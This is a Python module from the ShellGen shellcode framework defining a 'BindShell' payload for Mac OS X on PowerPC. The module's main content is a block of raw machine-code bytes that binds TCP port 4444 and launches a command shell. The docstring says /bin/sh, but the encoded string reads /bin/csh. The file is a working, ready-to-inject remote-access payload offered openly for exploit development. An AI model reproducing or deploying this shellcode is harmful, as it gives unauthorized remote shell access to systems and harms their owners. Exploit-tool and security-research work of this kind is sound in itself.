#!/usr/bin/env python

###############################################################################
## Bind to TCP port 4444 and execute /bin/sh in MacOSX/PowerPC               ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2013 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Bind to TCP port 4444 and execute /bin/sh."

__all__ = ["BindShell"]

from shellgen import Static

class BindShell (Static):
    """
    "Bind to TCP port 4444 and execute /bin/sh in MacOSX/PowerPC.
    Contains null characters.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"

    port = 4444

    bytes = (
        "\x38\x60\x00\x02\x38\x80\x00\x01\x38\xa0\x00\x06\x38\x00\x00"
        "\x61\x44\x00\x00\x02\x7c\x00\x02\x78\x7c\x7e\x1b\x78\x48\x00"
        "\x00\x0d\x00\x02\x11\x5c\x00\x00\x00\x00\x7c\x88\x02\xa6\x38"
        "\xa0\x00\x10\x38\x00\x00\x68\x7f\xc3\xf3\x78\x44\x00\x00\x02"
        "\x7c\x00\x02\x78\x38\x00\x00\x6a\x7f\xc3\xf3\x78\x44\x00\x00"
        "\x02\x7c\x00\x02\x78\x7f\xc3\xf3\x78\x38\x00\x00\x1e\x38\x80"
        "\x00\x10\x90\x81\xff\xe8\x38\xa1\xff\xe8\x38\x81\xff\xf0\x44"
        "\x00\x00\x02\x7c\x00\x02\x78\x7c\x7e\x1b\x78\x38\xa0\x00\x02"
        "\x38\x00\x00\x5a\x7f\xc3\xf3\x78\x7c\xa4\x2b\x78\x44\x00\x00"
        "\x02\x7c\x00\x02\x78\x38\xa5\xff\xff\x2c\x05\xff\xff\x40\x82"
        "\xff\xe5\x38\x00\x00\x42\x44\x00\x00\x02\x7c\x00\x02\x78\x7c"
        "\xa5\x2a\x79\x40\x82\xff\xfd\x7c\x68\x02\xa6\x38\x63\x00\x28"
        "\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8\x38\x00\x00"
        "\x3b\x7c\x00\x04\xac\x44\x00\x00\x02\x7c\x00\x02\x78\x7f\xe0"
        "\x00\x08\x2f\x62\x69\x6e\x2f\x63\x73\x68\x00\x00\x00\x00"
    )
